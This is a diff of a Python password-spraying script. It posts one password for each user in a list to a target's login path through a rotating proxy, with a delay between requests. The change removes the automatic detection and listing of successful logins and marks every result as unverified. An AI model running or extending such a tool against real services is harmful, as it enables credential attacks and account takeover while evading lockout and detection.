@@ -30,8 +30,6 @@ def parse_args() -> argparse.Namespace:
     p.add_argument("--password", required=True, help="Single password to spray")
     p.add_argument("--path", default="/login", help="Auth path on the target")
     p.add_argument("--delay", type=float, default=2.0, help="Seconds between requests")
-    p.add_argument("--success-code", type=int, default=302,
-                   help="HTTP status that signals a valid login")
     return p.parse_args()
 
 
@@ -41,7 +39,6 @@ def main() -> int:
         users = [u.strip() for u in fh if u.strip()]
 
     proxy = RotatingProxy(args.proxy)
-    hits = []
     for user in users:
         try:
             resp = proxy.post(
@@ -50,15 +47,12 @@ def main() -> int:
                 allow_redirects=False,
                 timeout=20,
             )
-            marker = "  <== HIT" if resp.status_code == args.success_code else ""
-            print(f"[{resp.status_code}] {user}{marker}")
-            if marker:
-                hits.append(user)
+            print(f"[{resp.status_code}] {user} (authentication outcome unverified)")
         except Exception as exc:  # noqa: BLE001
             print(f"[ERR] {user}: {exc}")
         time.sleep(args.delay)
 
-    print(f"\nDone. {len(hits)} candidate hit(s): {', '.join(hits) or '(none)'}")
+    print("\nDone. Review server-side authentication evidence before classifying results.")
     return 0
 
 
